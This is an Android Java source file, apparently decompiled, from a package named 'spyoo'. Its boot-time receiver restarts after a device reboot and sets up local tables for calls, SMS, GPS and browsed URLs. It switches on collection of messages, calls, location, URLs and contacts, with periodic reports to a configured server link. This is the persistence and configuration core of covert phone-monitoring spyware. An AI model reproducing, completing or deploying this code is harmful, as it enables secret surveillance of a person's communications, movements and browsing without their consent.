package iits.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import iits.code.bus.Account_BUS;
import iits.code.bus.Call_BUS;
import iits.code.bus.GPS_BUS;
import iits.code.bus.SMS_BUS;
import iits.code.bus.Setting_BUS;
import iits.code.bus.URL_BUS;
import iits.code.dto.Account_DTO;
import iits.code.dto.Setting_DTO;
import iits.common.Constants;
import iits.mamager.FileManager;
import iits.spyoo.AutoRun;

public class AutoRunReceiver extends BroadcastReceiver {
    private static final String TAG = "AutoRunReceiver";

    public void onReceive(Context context, Intent intent) {
        try {
            FileManager.WriteLog(1, TAG, "restart device");
            if (Setting_BUS.get(context) == null) {
                FileManager.WriteLog(1, TAG, "create database");
                Account_BUS.createTable(context);
                Setting_BUS.createTable(context);
                Call_BUS.createTable(context);
                SMS_BUS.createTable(context);
                GPS_BUS.createTable(context);
                URL_BUS.createTable(context);
                Setting_DTO system = new Setting_DTO();
                system.setSecretKey(Constants.SECRET_KEY);
                system.setFlagSMS(true);
                system.setFlagCall(true);
                system.setFlagGPS(true);
                system.setFlagURL(true);
                system.setFlagSpyCall(false);
                system.setFlagContact(true);
                system.setReportTime(30);
                system.setVertical(50);
                system.setHorizontal(500);
                system.setGPSInterval(5);
                system.setSendSetting(true);
                system.setRunMode(true);
                system.setLink(Constants.URL);
                Setting_BUS.insert(context, system);
                if (Account_BUS.get(context) == null) {
                    Account_BUS.insert(context, new Account_DTO());
                }
            }
            Intent i = new Intent(context, AutoRun.class);
            i.setFlags(268435456);
            context.startActivity(i);
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onReceive function: " + e.toString());
        }
    }
}
